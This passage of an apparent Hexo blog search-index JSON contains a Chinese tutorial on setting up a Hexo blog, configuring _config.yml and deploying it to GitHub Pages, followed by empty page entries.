-v</code>检验是否安装好</p>\n<ul>\n<li>然后创建一个新的文件夹，作为博客项目文件夹</li>\n</ul>\n<blockquote>\n<p>在本地创建一个文件夹，文件夹名最好与Repository中博客项目同名：username.github.io</p>\n<p>之后所有命令都在这个文件夹里进行</p>\n</blockquote>\n<p>初始化文件夹，安装独立博客的所有文件(该步骤可能会花较长的时间))</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>安装相关组件</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>确保Git已经部署</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>本地进行浏览</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g  <span class=\"comment\">//生成静态网页</span></span><br><span class=\"line\">$ hexo s  <span class=\"comment\">//打开本地服务器</span></span><br></pre></td></tr></table></figure>\n\n<p>  <img src=\"https://i.loli.net/2019/10/04/7u5lTiQec3BoPhp.png\" alt=\"20191004123455.png\"></p>\n<p>  成功打开服务器以后会有以上的提示，按住<code>Ctrl+c</code>关闭服务器，现在可以打开浏览器输入<code>127.0.0.1:4000</code>进行查看了</p>\n</li>\n</ul>\n<p>Hexo会有一个默认的主题：landspace，所以你打开博客应该是这样的<br><img src=\"https://i.loli.net/2019/10/04/r5TtMIb8icGX6Sp.png\" alt=\"20191004124344.png\"></p>\n<h3 id=\"2-将博客部署到Github\"><a href=\"#2-将博客部署到Github\" class=\"headerlink\" title=\"2.将博客部署到Github\"></a><strong>2.将博客部署到Github</strong></h3><p>部署之前，可以在配置文件 <strong><em>_config.yml</em></strong> 中进行一些个性化修改<br><img src=\"https://i.loli.net/2019/10/04/2d8aHT7IspmiYSA.png\" alt=\"20191004124904.png\"></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class=\"line\">那要么你就对照着看一下改就好</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Hexo Configuration</span><br><span class=\"line\">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class=\"line\">## Source: https://github.com/tommy351/hexo/</span><br><span class=\"line\"></span><br><span class=\"line\"># Site 这里的配置，哪项配置反映在哪里，可以参考我的博客</span><br><span class=\"line\">title: My Blog #博客名</span><br><span class=\"line\">subtitle: to be continued... #副标题</span><br><span class=\"line\">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class=\"line\">author: Yourname #作者，在博客底部可以看到</span><br><span class=\"line\">email: yourname@yourmail.com #你的联系邮箱</span><br><span class=\"line\">language: zh-CN #中文。如果不填则默认英文</span><br><span class=\"line\"></span><br><span class=\"line\"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class=\"line\">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span><br><span class=\"line\">url: http:<span class=\"comment\">//yoursite.com</span></span><br><span class=\"line\">root: <span class=\"regexp\">/</span></span><br><span class=\"line\"><span class=\"regexp\">permalink: :year/</span>:month/:day/:title/</span><br><span class=\"line\">tag_dir: tags</span><br><span class=\"line\">archive_dir: archives</span><br><span class=\"line\">category_dir: categories</span><br><span class=\"line\"></span><br><span class=\"line\"># Writing 文章布局、写作格式的定义，不修改</span><br><span class=\"line\">new_post_name: :title.md # File name of new posts</span><br><span class=\"line\">default_layout: post</span><br><span class=\"line\">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class=\"line\">titlecase: false # Transform title into titlecase</span><br><span class=\"line\">max_open_file: <span class=\"number\">100</span></span><br><span class=\"line\">filename_case: <span class=\"number\">0</span></span><br><span class=\"line\">highlight:</span><br><span class=\"line\">  enable: <span class=\"literal\">true</span></span><br><span class=\"line\">  backtick_code_block: <span class=\"literal\">true</span></span><br><span class=\"line\">  line_number: <span class=\"literal\">true</span></span><br><span class=\"line\">  tab_replace:</span><br><span class=\"line\"></span><br><span class=\"line\"># Category &amp; Tag</span><br><span class=\"line\">default_category: uncategorized</span><br><span class=\"line\">category_map:</span><br><span class=\"line\">tag_map:</span><br><span class=\"line\"></span><br><span class=\"line\"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class=\"line\">## 2: Enable pagination</span><br><span class=\"line\">## 1: Disable pagination</span><br><span class=\"line\">## 0: Fully Disable</span><br><span class=\"line\">archive: <span class=\"number\">1</span></span><br><span class=\"line\">category: <span class=\"number\">1</span></span><br><span class=\"line\">tag: <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"># Server 不修改</span><br><span class=\"line\">## Hexo uses Connect as a server</span><br><span class=\"line\">## You can customize the logger format as defined in</span><br><span class=\"line\">## http://www.senchalabs.org/connect/logger.html</span><br><span class=\"line\">port: <span class=\"number\">4000</span></span><br><span class=\"line\">logger: <span class=\"literal\">false</span></span><br><span class=\"line\">logger_format:</span><br><span class=\"line\"></span><br><span class=\"line\"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class=\"line\">## Hexo uses Moment.js to parse and display date</span><br><span class=\"line\">## You can customize the date format as defined in</span><br><span class=\"line\">## http://momentjs.com/docs/#/displaying/format/</span><br><span class=\"line\">date_format: YYYY-M-D</span><br><span class=\"line\">time_format: H:mm:ss</span><br><span class=\"line\"></span><br><span class=\"line\"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class=\"line\">## Set per_page to 0 to disable pagination</span><br><span class=\"line\">per_page: <span class=\"number\">10</span></span><br><span class=\"line\">pagination_dir: page</span><br><span class=\"line\"></span><br><span class=\"line\"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class=\"line\">disqus_shortname:</span><br><span class=\"line\"></span><br><span class=\"line\"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class=\"line\">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class=\"line\">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class=\"line\">theme: landscape</span><br><span class=\"line\">exclude_generator:</span><br><span class=\"line\">plugins:</span><br><span class=\"line\">- hexo-generator-feed</span><br><span class=\"line\">- hexo-generator-sitemap</span><br><span class=\"line\"></span><br><span class=\"line\"># Deployment 站点部署到github要配置</span><br><span class=\"line\">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repository: </span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure>\n\n<p>修改好之后，打开Github个人主页的Repository，进入到自己的博客项目，复制好项目的SSH码<br><img src=\"https://i.loli.net/2019/10/04/pRgvEuz3ibGwx4Q.png\" alt=\"20191004125316.png\"></p>\n<p>然后打开博客的配置文件 <strong><em>_config.yml</em></strong> 在最后面找到<code>Deployment</code>,将SSH码粘贴到repository后(冒号后面要空一格)</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repository: </span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure>\n\n<p>然后执行命令（每次修改博客之后都要进行一遍）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo clean <span class=\"comment\">// 清除存缓（不用每次执行）</span></span><br><span class=\"line\">$ hexo g     <span class=\"comment\">// 修改生成</span></span><br><span class=\"line\">$ hexo s     <span class=\"comment\">// 修改预览（不用每次执行） </span></span><br><span class=\"line\">$ hexo d     <span class=\"comment\">// 修改部署</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>执行hexo d进行博客部署的时候，会需要密码输入,确认身份</p>\n</blockquote>\n<p>过一会儿就能访问<code>username.github.io</code>进行查看了</p>\n<p>到这里搭建博客的工作也圆满结束了</p>\n<h3 id=\"3-写博客\"><a href=\"#3-写博客\" class=\"headerlink\" title=\"3.写博客\"></a><strong>3.写博客</strong></h3><p>在博客的根目录下找到<code>source/_post</code>,空白处Git Bush Here</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo <span class=\"keyword\">new</span> <span class=\"string\">'你想要的文章名字'</span></span><br></pre></td></tr></table></figure>\n\n<p>然后会在这个文件夹里面会生成一个Markdown文件，博客都是用Markdown写的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新生成的md文件，会自动生成:</span><br><span class=\"line\">---</span><br><span class=\"line\">title: </span><br><span class=\"line\">date: </span><br><span class=\"line\">categories:</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<p>这个模板文件在<code>scaffolds/post.md</code>中，可以进行增删</p>\n<h3 id=\"4-更换主题\"><a href=\"#4-更换主题\" class=\"headerlink\" title=\"4.更换主题\"></a><strong>4.更换主题</strong></h3><p>先进入到博客的根目录，使用clone的方法将主题下载下来</p>\n<p>然后</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd theme/主题名</span><br><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure>\n\n<p>回到根目录下，打开 <strong><em>_config.yml</em></strong>，找到<code>theme</code>，然后设置<code>theme:主题名</code>，接着就是</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<p>过一会儿，主题就换好啦</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>大体的流程就是这样，这几天搭博客，还是遇到了许多的问题，这里算是做一个总结，以后也方便查看。</p>\n","categories":["Summary"],"tags":["hexo"]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"about","url":"http://yoursite.com/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://yoursite.com/tag/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://yoursite.com/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]}]